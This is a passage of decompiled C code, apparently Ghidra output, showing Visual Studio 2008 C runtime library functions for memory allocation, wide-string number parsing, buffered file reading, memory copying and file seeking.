void * __cdecl __recalloc_crt(void *_Ptr,size_t _Count,size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = __recalloc(_Ptr,_Count,_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_Size == 0) {
      return (void *)0x0;
    }
    if (DAT_0042d890 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042d890 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  uint uVar3;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_0046ec44 == 3) {
      __lock(4);
      uVar3 = ___sbh_find_block((int)_Memory);
      if (uVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_0041563d();
      if (uVar3 != 0) {
        return local_20;
      }
    }
    sVar2 = HeapSize(DAT_0042d55c,0,_Memory);
  }
  return sVar2;
}



void FUN_0041563d(void)

{
  FUN_00412cbf(4);
  return;
}



// Library Function - Single Match
//  unsigned long __cdecl wcstoxl(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
wcstoxl(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  wchar_t *pwVar7;
  ushort uVar8;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  uint local_c;
  ulong uVar9;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  _C = *param_2;
  uVar9 = 0;
  pwVar1 = param_2;
  while( true ) {
    pwVar7 = pwVar1 + 1;
    iVar3 = __iswctype_l(_C,8,&local_1c);
    if (iVar3 == 0) break;
    _C = *pwVar7;
    pwVar1 = pwVar7;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_004156df:
    _C = *pwVar7;
    pwVar7 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_004156df;
  uVar6 = (uint)(ushort)_C;
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_00415743;
    }
    if ((*pwVar7 != L'x') && (*pwVar7 != L'X')) {
      param_4 = 8;
      goto LAB_00415743;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar7 == L'x' || (*pwVar7 == L'X')))) {
    uVar6 = (uint)(ushort)pwVar7[1];
    pwVar7 = pwVar7 + 2;
  }
LAB_00415743:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  local_c = (uint)(0xffffffff % (ulonglong)(uint)param_4);
  do {
    uVar8 = (ushort)uVar6;
    uVar5 = __wchartodigit(uVar8);
    if (uVar5 == 0xffffffff) {
      if (((uVar8 < 0x41) || (0x5a < uVar8)) && (0x19 < (ushort)(uVar8 - 0x61))) {
LAB_004157a4:
        pwVar7 = pwVar7 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (wchar_t **)0x0) {
            pwVar7 = param_2;
          }
          uVar9 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < uVar9)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < uVar9)))))))) {
          piVar2 = __errno();
          *piVar2 = 0x22;
          if ((param_5 & 1U) == 0) {
            uVar9 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            uVar9 = 0xffffffff;
          }
        }
        if (param_3 != (wchar_t **)0x0) {
          *param_3 = pwVar7;
        }
        if ((param_5 & 2U) != 0) {
          uVar9 = -uVar9;
        }
        if (local_10 != '\0') {
          *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
        }
        return uVar9;
      }
      if ((ushort)(uVar8 - 0x61) < 0x1a) {
        uVar6 = uVar6 - 0x20;
      }
      uVar5 = uVar6 - 0x37;
    }
    if ((uint)param_4 <= uVar5) goto LAB_004157a4;
    if ((uVar9 < uVar4) || ((uVar9 == uVar4 && (uVar5 <= local_c)))) {
      uVar9 = uVar9 * param_4 + uVar5;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) goto LAB_004157a4;
    }
    uVar6 = (uint)(ushort)*pwVar7;
    pwVar7 = pwVar7 + 1;
  } while( true );
}



// Library Function - Single Match
//  _wcstol
// 
// Library: Visual Studio 2008 Release

long __cdecl _wcstol(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_0042d8b8 == 0) {
    ppuVar2 = &PTR_DAT_0042bdf0;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = wcstoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_0042b798;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0046eb40)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_0046eb20 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  piVar6 = &DAT_0046eb40 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_00415aa0;
  }
  if (_MaxCharCount < 0x80000000) {
    local_14 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + iVar14 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_00415a8e;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        local_10 = (short *)__malloc_crt(_MaxCharCount);
        if (local_10 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_00415a8e;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_10 = (short *)_DstBuf;
      }
      psVar8 = local_10;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        *(char *)local_10 = cVar4;
        psVar8 = (short *)((int)local_10 + 1);
        uVar7 = _MaxCharCount - 1;
        local_14 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = local_10 + 1;
          uVar7 = _MaxCharCount - 2;
          local_14 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)local_10 + 3);
            local_14 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_00415dad;
          }
          goto LAB_00415da2;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_14 = (short *)((int)local_14 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_00415dad;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*local_10 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_14 = (short *)((int)local_14 + (int)local_10);
          _MaxCharCount = (uint)local_10;
          psVar8 = local_10;
          if (local_10 < local_14) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar8 = *(short *)_MaxCharCount;
                  psVar8 = psVar8 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_14 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_00415e50;
                  }
LAB_00415ee3:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_00415ee5:
                  *psVar8 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_00415ee3;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar8 == local_10) && (local_c == 10)) goto LAB_00415e50;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_00415eeb;
                    goto LAB_00415ee3;
                  }
                  if (local_c == 10) {
LAB_00415e50:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_00415ee5;
                  }
                  *psVar8 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar8 = sVar17;
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_00415eeb:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_14);
          }
          local_14 = (short *)((int)psVar8 - (int)local_10);
          goto LAB_00415dad;
        }
        if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_14 = (short *)((int)local_14 + (int)local_10);
        _MaxCharCount = (uint)local_10;
        psVar8 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_00415c2d;
                }
LAB_00415ca4:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar8 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_00415ca4;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_00415c2d;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_00415ca8;
                  goto LAB_00415ca4;
                }
                if (local_5 == '\n') {
LAB_00415c2d:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar8 = 10;
                }
                else {
                  *(undefined *)psVar8 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar8 = cVar4;
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_00415ca8:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_14);
        }
        local_14 = (short *)((int)psVar8 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_00415dad;
        bVar3 = *(byte *)(short *)((int)psVar8 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar8 = (short *)((int)psVar8 + -1);
          while ((((&DAT_0042b698)[bVar3] == '\0' && (iVar13 < 5)) && (local_10 <= psVar8))) {
            psVar8 = (short *)((int)psVar8 + -1);
            bVar3 = *(byte *)psVar8;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_0042b698)[*(byte *)psVar8] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_00415da9;
          }
          if ((char)(&DAT_0042b698)[*(byte *)psVar8] + 1 == iVar13) {
            psVar8 = (short *)((int)psVar8 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar12 = (short *)((int)psVar8 + 1);
            *(byte *)(*piVar6 + iVar14 + 5) = *(byte *)psVar8;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar12;
              psVar12 = psVar8 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar12;
              psVar12 = (short *)((int)psVar12 + 1);
            }
            psVar8 = (short *)((int)psVar12 - iVar13);
          }
        }
        iVar13 = (int)psVar8 - (int)local_10;
        local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_14 != (short *)0x0) {
          bVar15 = local_14 != (short *)iVar13;
          local_14 = (short *)((int)local_14 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_00415dad;
        }
        uVar11 = GetLastError();
LAB_00415da2:
        __dosmaperr(uVar11);
      }
LAB_00415da9:
      local_18 = -1;
LAB_00415dad:
      if (local_10 != (short *)_DstBuf) {
        _free(local_10);
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_00415a8e:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_00415aa0:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2008 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0046eb20)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_0041604b();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_00415fa7;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_00415fa7:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



void FUN_0041604b(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x0041624c)
// WARNING: Removing unreachable block (ram,0x00416239)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
